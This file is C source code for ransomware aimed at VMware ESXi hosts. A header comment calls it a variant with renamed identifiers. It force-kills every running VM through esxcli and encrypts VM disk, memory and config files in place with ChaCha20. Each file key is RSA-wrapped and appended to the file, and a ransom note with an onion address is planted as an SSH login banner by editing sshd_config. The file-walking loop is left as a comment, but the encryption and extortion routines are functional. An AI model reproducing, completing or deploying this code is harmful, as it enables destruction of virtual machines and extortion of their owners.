/* Variant: renamed identifiers, changed onion destination, different SSH
 * banner filename, reordered dotless extension list, libsodium ChaCha
 * spelling. Same technique: kill ESXi guests, encrypt VM files in place,
 * RSA-wrap keys, extort via SSH banner. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/rsa.h>
#include <sodium.h>

static const char *targets[] = {"vmem", "vswp", "vmx", "nvram", "vmdk", NULL};

static void halt_guests(void)
{
    char wid[64], cmd[160];
    FILE *p = popen("esxcli vm process list 2>/dev/null | grep 'World ID' | awk '{print $NF}'", "r");
    if (!p) return;
    while (fgets(wid, sizeof wid, p)) {
        wid[strcspn(wid, "\n")] = 0;
        if (!wid[0]) continue;
        snprintf(cmd, sizeof cmd, "esxcli vm process kill --type=force --world-id=%s 2>/dev/null", wid);
        system(cmd);
    }
    pclose(p);
}

static void post_notice(void)
{
    FILE *f = fopen64("/etc/ssh/login-banner", "w");
    char cfg[4096];
    FILE *c;
    if (!f) return;
    fputs("Your files are encrypted. Reach us at "
          "http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion\n", f);
    fclose(f);
    c = fopen64("/etc/ssh/sshd_config", "r");
    if (c) {
        size_t n = fread(cfg, 1, sizeof cfg - 1, c);
        fclose(c);
        cfg[n] = 0;
        if (!strstr(cfg, "Banner")) {
            FILE *a = fopen64("/etc/ssh/sshd_config", "a");
            if (a) { fputs("\nBanner /etc/ssh/login-banner\n", a); fclose(a); }
        }
    }
}

static void seal_file(const char *path, RSA *pk)
{
    unsigned char k[32], n[12], wrap[512], buf[8192];
    FILE *f = fopen64(path, "r+b");
    size_t got;
    int wl;
    if (!f) return;
    randombytes_buf(k, sizeof k);
    randombytes_buf(n, sizeof n);
    while ((got = fread(buf, 1, sizeof buf, f)) > 0) {
        long pos = ftell(f) - (long)got;
        crypto_stream_chacha20_ietf_xor(buf, buf, got, n, k);
        fseek(f, pos, SEEK_SET);
        fwrite(buf, 1, got, f);
        fseek(f, pos + (long)got, SEEK_SET);
    }
    wl = RSA_public_encrypt(32, k, wrap, pk, RSA_PKCS1_OAEP_PADDING);
    if (wl > 0) fwrite(wrap, 1, (size_t)wl, f);
    fclose(f);
}

int main(void)
{
    halt_guests();
    /* walk /vmfs/volumes, call seal_file on targets[] extensions */
    post_notice();
    return 0;
}
